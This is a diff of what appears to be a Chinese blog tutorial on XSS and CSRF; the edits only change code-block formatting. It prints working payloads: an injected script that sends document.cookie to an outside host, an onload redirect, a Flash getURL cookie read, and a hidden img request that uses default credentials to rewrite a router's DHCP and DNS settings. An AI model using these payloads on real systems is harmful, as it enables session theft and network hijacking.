@@ -17,21 +17,21 @@ category: f2e
 
 ####页面中输入DOM节点####
 
-<pre>
-	&lt;img src="xxx.gif" onload="window.location.href='johnqing.github.io'"&gt;
-</pre>
+{% highlight lua %}
+&lt;img src="xxx.gif" onload="window.location.href='johnqing.github.io'"&gt;
+{% endhighlight %}
 
 ####页面中输入js脚本####
 
-<pre>
+{% highlight lua %}
 	window.location.href='johnqing.github.io'
-</pre>
+{% endhighlight %}
 
 如果用户在，用户信息等form表单中输入
 
-<pre>
-	window.location.href='johnqing.github.io'
-</pre>
+{% highlight lua %}
+window.location.href='johnqing.github.io'
+{% endhighlight %}
 
 就会造成用户打开该页面就会执行自动跳转
 
@@ -39,9 +39,9 @@ category: f2e
 
 用户在添加表单时，可输入如下代码：
 
-<pre>
-	&lt;p&gt;
-</pre>
+{% highlight lua %}
+&lt;p&gt;
+{% endhighlight %}
 
 就可能造成页面错乱
 
@@ -51,15 +51,15 @@ category: f2e
 
 http://X.com/search.asp?q=ssss
 
-<pre>
-	搜索结果：&lt;?php $_GET('q') ?&gt;
-</pre>
+{% highlight lua %}
+搜索结果：&lt;?php $_GET('q') ?&gt;
+{% endhighlight %}
 
 好了，俺偷偷伪造一个请求发送给该网站
 
-<pre>
+{% highlight lua %}
 http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.cn?cookie="+document.cookie)&lt;/script&gt;
-</pre>
+{% endhighlight %}
 
 瞬间，他的cookie信息，都在这了。
 
@@ -67,9 +67,9 @@ http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.c
 
 当然flash作为web里一直存在的东东，当然也可以攻击。Flash中的getURL()动作，它可以使我们的页面重定向到函数指定的页面。
 
-<pre>
-	getURL('javascript:alert(document.cookie)');
-</pre>
+{% highlight lua %}
+getURL('javascript:alert(document.cookie)');
+{% endhighlight %}
 
 哈哈 cookie又在我这了。。
 
@@ -97,9 +97,9 @@ http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.c
 
 代码如下：
 
-<pre>
-	&lt;img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6"&gt;
-</pre>
+{% highlight lua %}
+&lt;img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6"&gt;
+{% endhighlight %}
 
 可以想象一下，假如你访问的是你的银行账户，而且丫也支持 `GET` 请求，很容易就会被攻击者利用这种漏洞，从账户中把钱拿出来
 
